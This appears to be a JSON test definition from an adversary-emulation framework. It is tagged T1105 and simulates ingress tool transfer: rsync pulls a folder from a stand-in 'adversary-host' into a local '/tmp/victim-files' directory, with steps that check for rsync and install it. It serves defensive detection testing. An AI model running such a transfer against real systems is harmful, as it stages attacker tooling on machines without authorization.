{
  "id": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
  "name": "rsync remote file copy (pull)",
  "description": "Utilize rsync to perform a remote file copy (pull)\n",
  "platforms": [
    "linux",
    "darwin"
  ],
  "steps": [
    {
      "id": "2bc45a2d-2d82-4600-81c8-0f3ba6e9e7c0",
      "type": "execute-command",
      "data": {
        "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "07a4c3cf-857a-4603-a1d7-c50564931d8b",
      "name": "Check dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "063f4888-3016-44a0-8b5a-5881098dba97",
      "name": "Resolve dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "97aae51f-5fe5-453d-aec7-a50fd0c6a8fd",
      "name": "Re-check dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "07a4c3cf-857a-4603-a1d7-c50564931d8b",
      "p": "on-success",
      "o": "2bc45a2d-2d82-4600-81c8-0f3ba6e9e7c0"
    },
    {
      "s": "07a4c3cf-857a-4603-a1d7-c50564931d8b",
      "p": "on-failure",
      "o": "063f4888-3016-44a0-8b5a-5881098dba97"
    },
    {
      "s": "063f4888-3016-44a0-8b5a-5881098dba97",
      "p": "on-success",
      "o": "97aae51f-5fe5-453d-aec7-a50fd0c6a8fd"
    },
    {
      "s": "97aae51f-5fe5-453d-aec7-a50fd0c6a8fd",
      "p": "on-failure",
      "o": "2bc45a2d-2d82-4600-81c8-0f3ba6e9e7c0"
    }
  ],
  "tags": [
    "T1105"
  ],
  "input_arguments": [
    {
      "name": "remote_path",
      "type": "path",
      "description": "Path of folder to copy",
      "value": "/tmp/adversary-rsync/"
    },
    {
      "name": "remote_host",
      "type": "string",
      "description": "Remote host to copy from",
      "value": "adversary-host"
    },
    {
      "name": "local_path",
      "type": "path",
      "description": "Local path to receive rsync",
      "value": "/tmp/victim-files"
    },
    {
      "name": "username",
      "type": "string",
      "description": "User account to authenticate on remote host",
      "value": "adversary"
    }
  ]
